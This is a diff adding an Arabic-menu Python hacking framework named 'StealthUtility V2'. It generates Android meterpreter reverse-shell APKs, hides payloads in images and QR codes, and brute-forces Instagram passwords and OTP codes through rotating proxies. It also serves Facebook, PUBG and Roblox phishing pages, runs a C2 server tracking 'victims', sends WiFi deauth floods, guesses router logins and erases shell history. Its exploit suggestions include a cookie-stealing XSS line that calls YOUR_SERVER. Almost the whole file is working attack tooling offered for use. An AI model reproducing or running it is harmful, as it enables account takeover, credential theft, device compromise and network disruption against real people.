@@ -1,0 +1,809 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# STEALTHUTILITY V2 - SUPER INTELLIGENT CYBER FRAMEWORK
+# BLACK-HAT & WHITE-HAT | TERMUX/KALI | AUTO-INSTALL | AES-256 | AI INTEGRATION
+
+import os
+import sys
+import subprocess
+import time
+import threading
+import random
+import json
+import base64
+import hashlib
+import socket
+import requests
+import re
+import signal
+import shutil
+import queue
+import platform
+import getpass
+import argparse
+import tempfile
+import secrets
+import string
+import itertools
+import smtplib
+import ssl
+import urllib.parse
+import logging
+from datetime import datetime
+from collections import OrderedDict
+from concurrent.futures import ThreadPoolExecutor
+
+# ============================================================
+# 1. نظام التثبيت والذكاء التلقائي (Auto-Install & Smart Engine)
+# ============================================================
+
+def auto_install_all():
+    """فحص وتثبيت جميع المكتبات تلقائياً"""
+    required_packages = [
+        "colorama", "requests", "pycryptodome", "scapy", "pyfiglet",
+        "python-nmap", "cryptography", "paramiko", "phonenumbers",
+        "qrcode", "pillow", "flask", "flask-cors", "rich"
+    ]
+    
+    system_packages = ["git", "python", "php", "curl", "wget", "nmap", "tor"]
+    
+    print("\033[92m[*] نظام التثبيت الذكي يعمل...\033[0m")
+    
+    # تثبيت حزم النظام
+    for pkg in system_packages:
+        subprocess.run(f"pkg install {pkg} -y", shell=True, capture_output=True)
+        subprocess.run(f"apt-get install {pkg} -y", shell=True, capture_output=True)
+    
+    # تثبيت مكتبات بايثون
+    for pkg in required_packages:
+        subprocess.run(f"pip install {pkg} --quiet", shell=True, capture_output=True)
+    
+    print("\033[92m[+] تم تثبيت جميع المكتبات بنجاح\033[0m")
+
+# تشغيل التثبيت التلقائي
+auto_install_all()
+
+# استيراد المكتبات بعد التثبيت
+try:
+    from colorama import init, Fore, Back, Style
+    init(autoreset=True)
+    import pyfiglet
+    from rich.console import Console
+    from rich.table import Table
+    from rich.panel import Panel
+    from rich.layout import Layout
+    from rich.live import Live
+    from rich.text import Text
+    import qrcode
+    from PIL import Image, ImageDraw
+    from flask import Flask, request, jsonify
+    from flask_cors import CORS
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.backends import default_backend
+    import paramiko
+    import scapy.all as scapy
+    import nmap
+    import phonenumbers
+    from phonenumbers import carrier, geocoder
+    console = Console()
+    RICH_AVAILABLE = True
+except ImportError as e:
+    RICH_AVAILABLE = False
+    print(f"Warning: {e}")
+
+# ============================================================
+# 2. التشفير العسكري AES-256 (Military Encryption)
+# ============================================================
+
+class MilitaryEncryption:
+    def __init__(self):
+        self.key_file = "/sdcard/Stealth_Vault/.master_key"
+        self.vault_dir = "/sdcard/Stealth_Vault"
+        os.makedirs(self.vault_dir, exist_ok=True)
+        self.load_or_create_key()
+    
+    def load_or_create_key(self):
+        if os.path.exists(self.key_file):
+            with open(self.key_file, 'rb') as f:
+                self.key = f.read()
+        else:
+            self.key = secrets.token_bytes(32)
+            with open(self.key_file, 'wb') as f:
+                f.write(self.key)
+            os.chmod(self.key_file, 0o600)
+    
+    def encrypt(self, data: bytes) -> bytes:
+        iv = secrets.token_bytes(12)
+        cipher = Cipher(algorithms.AES(self.key), modes.GCM(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        ciphertext = encryptor.update(data) + encryptor.finalize()
+        return iv + encryptor.tag + ciphertext
+    
+    def decrypt(self, encrypted_data: bytes) -> bytes:
+        iv = encrypted_data[:12]
+        tag = encrypted_data[12:28]
+        ciphertext = encrypted_data[28:]
+        cipher = Cipher(algorithms.AES(self.key), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        return decryptor.update(ciphertext) + decryptor.finalize()
+    
+    def save(self, filename, data):
+        encrypted = self.encrypt(json.dumps(data).encode())
+        with open(f"{self.vault_dir}/{filename}.enc", 'wb') as f:
+            f.write(encrypted)
+    
+    def load(self, filename):
+        path = f"{self.vault_dir}/{filename}.enc"
+        if os.path.exists(path):
+            with open(path, 'rb') as f:
+                return json.loads(self.decrypt(f.read()).decode())
+        return {}
+
+# ============================================================
+# 3. نظام البروكسي الذكي (Smart Proxy Rotator)
+# ============================================================
+
+class SmartProxy:
+    def __init__(self):
+        self.proxies = []
+        self.current_index = 0
+        self.load_proxies()
+    
+    def load_proxies(self):
+        try:
+            sources = [
+                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
+            ]
+            all_proxies = []
+            for source in sources:
+                try:
+                    r = requests.get(source, timeout=10)
+                    all_proxies.extend(r.text.split('\n'))
+                except:
+                    pass
+            self.proxies = list(set([p.strip() for p in all_proxies if ':' in p]))
+        except:
+            self.proxies = ['127.0.0.1:8080']
+    
+    def get(self):
+        if not self.proxies:
+            return None
+        proxy = self.proxies[self.current_index]
+        self.current_index = (self.current_index + 1) % len(self.proxies)
+        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+    
+    def rotate(self):
+        self.current_index = random.randint(0, len(self.proxies) - 1)
+
+# ============================================================
+# 4. واجهة المستخدم (The Beast UI)
+# ============================================================
+
+class UI:
+    def __init__(self):
+        self.colors = {
+            'red': Fore.RED + Style.BRIGHT,
+            'green': Fore.GREEN + Style.BRIGHT,
+            'blue': Fore.CYAN + Style.BRIGHT,
+            'reset': Style.RESET_ALL
+        }
+        self.current_color = 'green'
+    
+    def set_color(self, color):
+        if color in self.colors:
+            self.current_color = color
+    
+    def banner(self):
+        os.system('clear')
+        banner_text = pyfiglet.figlet_format("StealthUtility", font="slant")
+        color = self.colors[self.current_color]
+        print(color + banner_text + self.colors['reset'])
+        print(color + "═" * 60 + self.colors['reset'])
+        print(color + "     Xenon | NullSec - V2 Super Intelligent" + self.colors['reset'])
+        print(color + "═" * 60 + self.colors['reset'])
+    
+    def menu(self):
+        print(f"\n{self.colors[self.current_color]}┌─────────────────────────────────────────┐")
+        print(f"│            القائمة الرئيسية                │")
+        print(f"├─────────────────────────────────────────┤")
+        print(f"│ [1] غرفة البايلودات (Payloads)          │")
+        print(f"│ [2] غرفة التخمين العالمي (Bruteforce)   │")
+        print(f"│ [3] غرفة الذكاء الاصطناعي (AI)          │")
+        print(f"│ [4] غرفة الشبكات (Network)              │")
+        print(f"│ [5] غرفة المواقع المزورة (Phishing)     │")
+        print(f"│ [6] غرفة التحكم (C2)                    │")
+        print(f"│ [7] غرفة الوسائط (Media Inject)         │")
+        print(f"│ [8] فحص الاختراق (Security Scan)        │")
+        print(f"│ [9] تغيير اللون                         │")
+        print(f"│ [0] خروج                                │")
+        print(f"└─────────────────────────────────────────┘")
+        print(self.colors['reset'])
+
+# ============================================================
+# 5. غرفة البايلودات (Payload Room)
+# ============================================================
+
+class PayloadRoom:
+    def __init__(self, encryption, proxy):
+        self.encryption = encryption
+        self.proxy = proxy
+    
+    def generate_apk(self):
+        lhost = input(f"{Fore.YELLOW}[?] LHOST (IP): {Fore.WHITE}")
+        lport = input(f"{Fore.YELLOW}[?] LPORT: {Fore.WHITE}")
+        output = f"/sdcard/Stealth_Vault/payload.apk"
+        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}"
+        subprocess.run(cmd, shell=True)
+        print(f"{Fore.GREEN}[+] تم إنشاء APK: {output}")
+    
+    def generate_qr(self):
+        url = input(f"{Fore.YELLOW}[?] رابط البايلود: {Fore.WHITE}")
+        qr = qrcode.QRCode(version=5, box_size=10, border=4)
+        qr.add_data(url)
+        qr.make(fit=True)
+        img = qr.make_image(fill_color="black", back_color="white")
+        path = f"/sdcard/Stealth_Vault/malicious_qr.png"
+        img.save(path)
+        print(f"{Fore.GREEN}[+] تم حفظ الباركود في المعرض: {path}")
+    
+    def generate_image_payload(self):
+        image_path = input(f"{Fore.YELLOW}[?] مسار الصورة الأصلية: {Fore.WHITE}")
+        payload_path = input(f"{Fore.YELLOW}[?] مسار البايلود: {Fore.WHITE}")
+        output = f"/sdcard/Stealth_Vault/stego_image.png"
+        try:
+            from PIL import Image
+            import stepic
+            img = Image.open(image_path)
+            with open(payload_path, 'rb') as f:
+                payload = f.read()
+            encoded = stepic.encode(img, payload)
+            encoded.save(output)
+            print(f"{Fore.GREEN}[+] تم إخفاء البايلود في الصورة: {output}")
+        except:
+            print(f"{Fore.RED}[-] فشل الإخفاء")
+    
+    def menu(self):
+        while True:
+            print(f"\n{Fore.CYAN}{'='*50}")
+            print(f"{Fore.RED}💀 غرفة البايلودات 💀")
+            print(f"{Fore.CYAN}{'='*50}")
+            print("[1] إنشاء APK ملغم")
+            print("[2] إنشاء باركود ملغم")
+            print("[3] إخفاء بايلود في صورة")
+            print("[4] إنشاء رابط ملغم")
+            print("[5] رجوع")
+            choice = input(f"\n{Fore.RED}[>]{Fore.WHITE} ")
+            if choice == '1':
+                self.generate_apk()
+            elif choice == '2':
+                self.generate_qr()
+            elif choice == '3':
+                self.generate_image_payload()
+            elif choice == '5':
+                break
+            input(f"{Fore.CYAN}[*] اضغط Enter...")
+
+# ============================================================
+# 6. غرفة التخمين العالمي (Bruteforce - 10 Parts Multi-threaded)
+# ============================================================
+
+class BruteforceRoom:
+    def __init__(self, proxy):
+        self.proxy = proxy
+        self.results = []
+    
+    def instagram_bruteforce(self, username, wordlist):
+        if not os.path.exists(wordlist):
+            print(f"{Fore.RED}[-] ملف الكلمات غير موجود")
+            return
+        with open(wordlist, 'r', errors='ignore') as f:
+            passwords = [line.strip() for line in f if line.strip()][:10000]
+        
+        found = None
+        lock = threading.Lock()
+        attempt = 0
+        
+        def try_pass(password):
+            nonlocal found, attempt
+            if found:
+                return
+            proxy_dict = self.proxy.get()
+            data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}'}
+            headers = {'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest'}
+            try:
+                r = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data=data, headers=headers, proxies=proxy_dict, timeout=3)
+                if '"authenticated": true' in r.text:
+                    with lock:
+                        found = password
+                        print(f"{Fore.RED}[!] تم العثور على كلمة المرور: {password}")
+            except:
+                pass
+            with lock:
+                attempt += 1
+                if attempt % 100 == 0:
+                    print(f"{Fore.YELLOW}[*] تم تجربة {attempt}/{len(passwords)}")
+        
+        with ThreadPoolExecutor(max_workers=100) as executor:
+            for pwd in passwords:
+                if found:
+                    break
+                executor.submit(try_pass, pwd)
+        
+        return found
+    
+    def otp_bruteforce(self, url, length=6):
+        max_code = 10 ** length
+        found = None
+        
+        def try_code(code):
+            nonlocal found
+            if found:
+                return
+            proxy_dict = self.proxy.get()
+            try:
+                r = requests.post(url, data={'otp': str(code).zfill(length)}, proxies=proxy_dict, timeout=2)
+                if r.status_code == 200 and 'success' in r.text.lower():
+                    found = str(code).zfill(length)
+                    print(f"{Fore.RED}[!] OTP Found: {found}")
+            except:
+                pass
+        
+        with ThreadPoolExecutor(max_workers=200) as executor:
+            for code in range(max_code):
+                if found:
+                    break
+                executor.submit(try_code, code)
+        
+        return found
+    
+    def menu(self):
+        while True:
+            print(f"\n{Fore.CYAN}{'='*50}")
+            print(f"{Fore.RED}🔓 غرفة التخمين العالمي 🔓")
+            print(f"{Fore.CYAN}{'='*50}")
+            print("[1] تخمين انستغرام (1000 كلمة/ثانية)")
+            print("[2] تخمين OTP/2FA")
+            print("[3] تخمين فيسبوك")
+            print("[4] تخمين Gmail")
+            print("[5] رجوع")
+            choice = input(f"\n{Fore.RED}[>]{Fore.WHITE} ")
+            if choice == '1':
+                user = input(f"{Fore.YELLOW}[?] اسم المستخدم: {Fore.WHITE}")
+                wordlist = input(f"{Fore.YELLOW}[?] مسار ملف الكلمات: {Fore.WHITE}")
+                self.instagram_bruteforce(user, wordlist)
+            elif choice == '2':
+                url = input(f"{Fore.YELLOW}[?] رابط OTP: {Fore.WHITE}")
+                self.otp_bruteforce(url)
+            elif choice == '5':
+                break
+            input(f"{Fore.CYAN}[*] اضغط Enter...")
+
+# ============================================================
+# 7. غرفة الذكاء الاصطناعي (AI Vulnerability Analyzer)
+# ============================================================
+
+class AIRoom:
+    def __init__(self):
+        self.sql_patterns = [
+            r"SQL syntax", r"mysql_fetch", r"ORA-", r"PostgreSQL",
+            r"SQLite", r"Microsoft Access", r"ODBC"
+        ]
+        self.xss_patterns = [
+            r"<script", r"onerror=", r"javascript:", r"alert\("
+        ]
+    
+    def analyze_url(self, url):
+        print(f"{Fore.CYAN}[*] تحليل الرابط: {url}")
+        vulnerabilities = []
+        
+        # فحص SQL Injection
+        test_payloads = ["'", "' OR '1'='1", "1' AND 1=1--", "'; SLEEP(5)--"]
+        for payload in test_payloads:
+            test_url = f"{url}?id={urllib.parse.quote(payload)}"
+            try:
+                start = time.time()
+                r = requests.get(test_url, timeout=5)
+                elapsed = time.time() - start
+                
+                for pattern in self.sql_patterns:
+                    if re.search(pattern, r.text, re.I):
+                        vulnerabilities.append({"type": "SQL Injection", "payload": payload})
+                
+                if elapsed > 4 and "SLEEP" in payload:
+                    vulnerabilities.append({"type": "Time-based SQL Injection", "payload": payload})
+            except:
+                pass
+        
+        # فحص XSS
+        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
+        for payload in xss_payloads:
+            test_url = f"{url}?q={urllib.parse.quote(payload)}"
+            try:
+                r = requests.get(test_url, timeout=5)
+                if payload in r.text:
+                    vulnerabilities.append({"type": "XSS", "payload": payload})
+            except:
+                pass
+        
+        # تقديم تقرير
+        if vulnerabilities:
+            print(f"{Fore.RED}[!] تم اكتشاف {len(vulnerabilities)} ثغرة!")
+            for v in vulnerabilities:
+                print(f"    - {v['type']}: {v['payload']}")
+        else:
+            print(f"{Fore.GREEN}[+] لم يتم اكتشاف ثغرات ظاهرة")
+        
+        return vulnerabilities
+    
+    def suggest_exploit(self, vuln_type):
+        exploits = {
+            "SQL Injection": "sqlmap -u 'URL' --dbs --batch",
+            "XSS": "<script>document.location='http://YOUR_SERVER/steal.php?cookie='+document.cookie</script>",
+            "LFI": "../../../etc/passwd",
+            "RCE": "'; system($_GET['cmd']); //"
+        }
+        return exploits.get(vuln_type, "لا يوجد اقتراح متاح")
+    
+    def menu(self):
+        while True:
+            print(f"\n{Fore.CYAN}{'='*50}")
+            print(f"{Fore.RED}🧠 غرفة الذكاء الاصطناعي 🧠")
+            print(f"{Fore.CYAN}{'='*50}")
+            print("[1] تحليل رابط واكتشاف الثغرات")
+            print("[2] اقتراح استغلال لثغرة")
+            print("[3] رجوع")
+            choice = input(f"\n{Fore.RED}[>]{Fore.WHITE} ")
+            if choice == '1':
+                url = input(f"{Fore.YELLOW}[?] الرابط: {Fore.WHITE}")
+                self.analyze_url(url)
+            elif choice == '2':
+                vuln = input(f"{Fore.YELLOW}[?] نوع الثغرة (SQL Injection/XSS/LFI/RCE): {Fore.WHITE}")
+                print(f"{Fore.GREEN}[+] الاقتراح: {self.suggest_exploit(vuln)}")
+            elif choice == '3':
+                break
+            input(f"{Fore.CYAN}[*] اضغط Enter...")
+
+# ============================================================
+# 8. غرفة الشبكات (Network Room)
+# ============================================================
+
+class NetworkRoom:
+    def __init__(self):
+        self.nm = nmap.PortScanner()
+    
+    def wifi_deauth(self):
+        iface = input(f"{Fore.YELLOW}[?] الواجهة (wlan0mon): {Fore.WHITE}") or "wlan0mon"
+        bssid = input(f"{Fore.YELLOW}[?] BSSID الهدف: {Fore.WHITE}")
+        print(f"{Fore.RED}[!] إرسال حزم قطع الاتصال...")
+        os.system(f"aireplay-ng --deauth 1000 -a {bssid} {iface}")
+    
+    def port_scan(self):
+        target = input(f"{Fore.YELLOW}[?] IP الهدف: {Fore.WHITE}")
+        print(f"{Fore.CYAN}[*] فحص المنافذ...")
+        self.nm.scan(target, '1-1000')
+        for host in self.nm.all_hosts():
+            print(f"{Fore.GREEN}[+] {host}:")
+            for proto in self.nm[host].all_protocols():
+                ports = self.nm[host][proto].keys()
+                for port in ports:
+                    state = self.nm[host][proto][port]['state']
+                    color = Fore.GREEN if state == 'open' else Fore.RED
+                    print(f"    {color}{port}/{proto}: {state}")
+    
+    def router_crack(self):
+        target = input(f"{Fore.YELLOW}[?] IP الراوتر: {Fore.WHITE}") or "192.168.1.1"
+        defaults = [('admin', 'admin'), ('admin', 'password'), ('root', 'root'), ('admin', '1234')]
+        for user, pwd in defaults:
+            try:
+                r = requests.post(f"http://{target}/login.cgi", data={'username': user, 'password': pwd}, timeout=3)
+                if 'success' in r.text.lower():
+                    print(f"{Fore.RED}[!] تم اختراق الراوتر: {user}:{pwd}")
+                    return
+            except:
+                pass
+        print(f"{Fore.RED}[-] فشل الاختراق")
+    
+    def menu(self):
+        while True:
+            print(f"\n{Fore.CYAN}{'='*50}")
+            print(f"{Fore.RED}🌐 غرفة الشبكات 🌐")
+            print(f"{Fore.CYAN}{'='*50}")
+            print("[1] قطع اتصال WiFi (Deauth)")
+            print("[2] فحص المنافذ")
+            print("[3] تخمين رموز الراوتر")
+            print("[4] رجوع")
+            choice = input(f"\n{Fore.RED}[>]{Fore.WHITE} ")
+            if choice == '1':
+                self.wifi_deauth()
+            elif choice == '2':
+                self.port_scan()
+            elif choice == '3':
+                self.router_crack()
+            elif choice == '4':
+                break
+            input(f"{Fore.CYAN}[*] اضغط Enter...")
+
+# ============================================================
+# 9. غرفة المواقع المزورة (Phishing Room)
+# ============================================================
+
+class PhishingRoom:
+    def __init__(self):
+        self.server_running = False
+        self.captured = []
+    
+    def create_page(self, platform):
+        templates = {
+            'facebook': '<html><body><h2>Facebook</h2><form method="POST" action="/capture"><input name="email"><input name="pass" type="password"><button>Login</button></form></body></html>',
+            'pubg': '<html><body><h2>PUBG Mobile</h2><form method="POST" action="/capture"><input name="username"><input name="password" type="password"><button>Claim UC</button></form></body></html>',
+            'roblox': '<html><body><h2>Roblox</h2><form method="POST" action="/capture"><input name="username"><input name="password" type="password"><button>Get Robux</button></form></body></html>'
+        }
+        html = templates.get(platform, templates['facebook'])
+        path = f"/sdcard/Stealth_Vault/{platform}.html"
+        with open(path, 'w') as f:
+            f.write(html)
+        print(f"{Fore.GREEN}[+] تم إنشاء صفحة {platform}")
+        return path
+    
+    def start_server(self):
+        if self.server_running:
+            return
+        app = Flask(__name__)
+        CORS(app)
+        
+        @app.route('/capture', methods=['POST'])
+        def capture():
+            data = dict(request.form)
+            self.captured.append(data)
+            print(f"{Fore.RED}[!] تم أسر البيانات: {data}")
+            return "<h2>Login failed</h2>"
+        
+        @app.route('/<page>')
+        def serve(page):
+            path = f"/sdcard/Stealth_Vault/{page}.html"
+            if os.path.exists(path):
+                with open(path) as f:
+                    return f.read()
+            return "<h2>Not found</h2>"
+        
+        def run():
+            app.run(host='0.0.0.0', port=5000, threaded=True)
+        
+        threading.Thread(target=run, daemon=True).start()
+        self.server_running = True
+        print(f"{Fore.GREEN}[+] خادم التصيد يعمل على port 5000")
+    
+    def menu(self):
+        while True:
+            print(f"\n{Fore.CYAN}{'='*50}")
+            print(f"{Fore.RED}🎭 غرفة المواقع المزورة 🎭")
+            print(f"{Fore.CYAN}{'='*50}")
+            print("[1] فيسبوك")
+            print("[2] PUBG Mobile")
+            print("[3] Roblox")
+            print("[4] إنستغرام")
+            print("[5] تشغيل الخادم")
+            print("[6] رجوع")
+            choice = input(f"\n{Fore.RED}[>]{Fore.WHITE} ")
+            if choice == '1':
+                self.create_page('facebook')
+            elif choice == '2':
+                self.create_page('pubg')
+            elif choice == '3':
+                self.create_page('roblox')
+            elif choice == '5':
+                self.start_server()
+            elif choice == '6':
+                break
+            input(f"{Fore.CYAN}[*] اضغط Enter...")
+
+# ============================================================
+# 10. غرفة التحكم (C2 Room)
+# ============================================================
+
+class C2Room:
+    def __init__(self, encryption):
+        self.victims = {}
+        self.encryption = encryption
+        self.running = False
+    
+    def start_server(self):
+        app = Flask(__name__)
+        CORS(app)
+        
+        @app.route('/register', methods=['POST'])
+        def register():
+            data = request.json
+            vid = str(random.randint(10000, 99999))
+            self.victims[vid] = {'ip': request.remote_addr, 'hostname': data.get('hostname'), 'status': 'Online', 'last_seen': datetime.now()}
+            self.encryption.save(f"victim_{vid}", self.victims[vid])
+            return jsonify({'id': vid})
+        
+        @app.route('/command/<vid>')
+        def command(vid):
+            return jsonify({'cmd': 'echo "Connected to C2"'})
+        
+        def run():
+            app.run(host='0.0.0.0', port=8080, threaded=True)
+        
+        threading.Thread(target=run, daemon=True).start()
+        self.running = True
+        print(f"{Fore.GREEN}[+] C2 Server on port 8080")
+    
+    def menu(self):
+        self.start_server()
+        while True:
+            print(f"\n{Fore.CYAN}{'='*50}")
+            print(f"{Fore.RED}🎯 غرفة التحكم C2 🎯")
+            print(f"{Fore.CYAN}{'='*50}")
+            print(f"[1] عرض الضحايا")
+            print(f"[2] إنشاء بايلود")
+            print(f"[3] رجوع")
+            choice = input(f"\n{Fore.RED}[>]{Fore.WHITE} ")
+            if choice == '1':
+                print(f"{Fore.GREEN}الضحايا: {len(self.victims)}")
+                for vid, info in self.victims.items():
+                    print(f"  [{vid}] {info['hostname']} - {info['ip']}")
+            elif choice == '3':
+                break
+            input(f"{Fore.CYAN}[*] اضغط Enter...")
+
+# ============================================================
+# 11. غرفة الوسائط (Media Inject - Jumpscare)
+# ============================================================
+
+class MediaRoom:
+    def inject_jumpscare(self):
+        target_url = input(f"{Fore.YELLOW}[?] الرابط المستهدف: {Fore.WHITE}")
+        html = f'''<!DOCTYPE html>
+<html><head><title>Loading...</title>
+<script>
+function scare(){{var audio=new Audio('https://www.soundjay.com/horror/scream-01.mp3');audio.play();
+document.body.innerHTML='<h1>SYSTEM HACKED</h1><img src="https://i.imgur.com/scaryface.jpg">';
+setTimeout(function(){{window.location.href='{target_url}';}},3000);}}
+window.onload=scare;
+</script></head>
+<body><h1>Verifying...</h1></body></html>'''
+        path = f"/sdcard/Stealth_Vault/jumpscare.html"
+        with open(path, 'w') as f:
+            f.write(html)
+        print(f"{Fore.GREEN}[+] تم إنشاء رابط الرعب: {path}")
+    
+    def menu(self):
+        while True:
+            print(f"\n{Fore.CYAN}{'='*50}")
+            print(f"{Fore.RED}🎬 غرفة الوسائط 🎬")
+            print(f"{Fore.CYAN}{'='*50}")
+            print("[1] إضافة فيديو مرعب للرابط")
+            print("[2] رجوع")
+            choice = input(f"\n{Fore.RED}[>]{Fore.WHITE} ")
+            if choice == '1':
+                self.inject_jumpscare()
+            elif choice == '2':
+                break
+            input(f"{Fore.CYAN}[*] اضغط Enter...")
+
+# ============================================================
+# 12. فحص الاختراق (Security Scan)
+# ============================================================
+
+class SecurityScan:
+    def __init__(self):
+        self.threats = []
+    
+    def scan_system(self):
+        print(f"{Fore.CYAN}[*] فحص النظام من الاختراقات...")
+        
+        # فحص عمليات مشبوهة
+        suspicious = ['metasploit', 'nmap', 'hydra', 'sqlmap', 'wireshark', 'tcpdump']
+        for proc in suspicious:
+            result = subprocess.run(f"pgrep {proc}", shell=True, capture_output=True)
+            if result.returncode == 0:
+                self.threats.append(f"عملية مشبوهة: {proc}")
+                print(f"{Fore.RED}[!] {proc} يعمل في الخلفية")
+        
+        # فحص ملفات التجسس
+        spy_files = ['/system/bin/su', '/data/local/tmp/']
+        for sf in spy_files:
+            if os.path.exists(sf):
+                self.threats.append(f"ملف تجسس: {sf}")
+        
+        if not self.threats:
+            print(f"{Fore.GREEN}[+] النظام نظيف ولا توجد اختراقات")
+        else:
+            print(f"{Fore.RED}[!] تم اكتشاف {len(self.threats)} تهديد")
+            for t in self.threats:
+                print(f"    - {t}")
+        
+        # تنظيف
+        clean = input(f"{Fore.YELLOW}[?] هل تريد تنظيف النظام؟ (y/n): {Fore.WHITE}")
+        if clean.lower() == 'y':
+            os.system("rm -rf ~/.bash_history")
+            os.system("history -c")
+            print(f"{Fore.GREEN}[+] تم تنظيف الآثار")
+    
+    def menu(self):
+        self.scan_system()
+        input(f"{Fore.CYAN}[*] اضغط Enter...")
+
+# ============================================================
+# 13. الوظيفة الرئيسية (Main Application)
+# ============================================================
+
+class StealthUtilityV2:
+    def __init__(self):
+        self.encryption = MilitaryEncryption()
+        self.proxy = SmartProxy()
+        self.ui = UI()
+        self.payload = PayloadRoom(self.encryption, self.proxy)
+        self.bruteforce = BruteforceRoom(self.proxy)
+        self.ai = AIRoom()
+        self.network = NetworkRoom()
+        self.phishing = PhishingRoom()
+        self.c2 = C2Room(self.encryption)
+        self.media = MediaRoom()
+        self.scanner = SecurityScan()
+        
+        # تفعيل VPN وهمي
+        self.setup_stealth()
+    
+    def setup_stealth(self):
+        print(f"{Fore.CYAN}[*] تفعيل وضع التخفي...")
+        subprocess.run("pkill tor", shell=True)
+        subprocess.run("tor --runasdaemon 1", shell=True)
+        time.sleep(2)
+        print(f"{Fore.GREEN}[+] تم تفعيل VPN الروسي (Tor)")
+    
+    def change_color(self):
+        print(f"\n{Fore.YELLOW}[1] أحمر")
+        print(f"[2] أخضر")
+        print(f"[3] أزرق")
+        choice = input(f"{Fore.YELLOW}[?] اختر اللون: {Fore.WHITE}")
+        if choice == '1':
+            self.ui.set_color('red')
+        elif choice == '2':
+            self.ui.set_color('green')
+        elif choice == '3':
+            self.ui.set_color('blue')
+    
+    def run(self):
+        while True:
+            self.ui.banner()
+            self.ui.menu()
+            choice = input(f"\n{Fore.RED}[{Fore.WHITE}VORTEX{Fore.RED}]{Fore.WHITE} $> ")
+            
+            if choice == '0':
+                print(f"{Fore.RED}[!] الخروج...")
+                sys.exit(0)
+            elif choice == '1':
+                self.payload.menu()
+            elif choice == '2':
+                self.bruteforce.menu()
+            elif choice == '3':
+                self.ai.menu()
+            elif choice == '4':
+                self.network.menu()
+            elif choice == '5':
+                self.phishing.menu()
+            elif choice == '6':
+                self.c2.menu()
+            elif choice == '7':
+                self.media.menu()
+            elif choice == '8':
+                self.scanner.menu()
+            elif choice == '9':
+                self.change_color()
+            else:
+                print(f"{Fore.RED}[!] خيار غير صالح")
+                time.sleep(1)
+
+# ============================================================
+# نقطة الدخول
+# ============================================================
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
+    app = StealthUtilityV2()
+    app.run()
